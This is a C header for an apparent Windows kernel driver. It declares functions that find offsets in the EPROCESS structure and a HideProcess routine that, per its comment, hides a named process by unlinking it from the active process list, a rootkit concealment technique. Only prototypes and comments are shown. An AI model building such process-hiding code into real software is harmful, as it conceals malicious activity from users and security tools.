/********************************************************************************
*																				*
* File Name:																	*
* 	misc.h																		*
*																				*
* Abstract:																		*
* 	This file contains miscellaneous function definitions.						*
*																				*
* Revision History:																*
* 	Date:	02 August 2024														*
* 	Author: Arpit Mathur														*
* 	Desc:	Created																*
*																				*
********************************************************************************/


/////////////////////////////////////////////////////////////////////
//	P R A G M A S.
/////////////////////////////////////////////////////////////////////
#pragma once


/////////////////////////////////////////////////////////////////////
//	F U N C T I O N  P R O T O T Y P E S.
/////////////////////////////////////////////////////////////////////

//***********************************************************************************
// 
//	Function:
//		InitializeOffsets
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Initialize necessary offsets in the EPROCESS structure.
//
//	Return Value:
//		BOOLEAN.
//      TRUE if process name or process id offsets are found.
//      Otherwise FALSE.
//
//***********************************************************************************
BOOLEAN
InitializeOffsets();


//***********************************************************************************
// 
//	Function:
//		CalcProcessNameOffset
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Set process name offset by finding offset of the process name in the 
//      EPROCESS structure.
//
//	Return Value:
//		ULONG.
//      0 if process name offset is not found.
//      Otherwise non 0.
//
//***********************************************************************************
ULONG
CalcProcessNameOffset();


//***********************************************************************************
// 
//	Function:
//		CalcPIDOffset.
//
//	Parameters:
//		None.
//
//	Routine Description:
//		Set process id offset in the EPROCESS structure.
//
//	Return Value:
//		ULONG.
//      0 if process id offset is not found.
//      Otherwise non 0.
//
//***********************************************************************************
ULONG
CalcPIDOffset();


//***********************************************************************************
// 
//	Function:
//		HideProcess.
//
//	Parameters:
//		[IN]  char* target
//      Name of the process to hide.
//
//	Routine Description:
//		Hides the specified process by unlinking it from the active process list 
//      in the EPROCESS structure.
//
//	Return Value:
//		VOID.
//
//***********************************************************************************
VOID
HideProcess(
    IN  char* target
);